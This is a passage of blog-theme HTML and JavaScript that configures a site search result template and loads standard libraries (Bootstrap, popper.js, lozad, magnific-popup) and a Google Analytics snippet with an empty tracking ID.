pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://maaelhamid.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script>
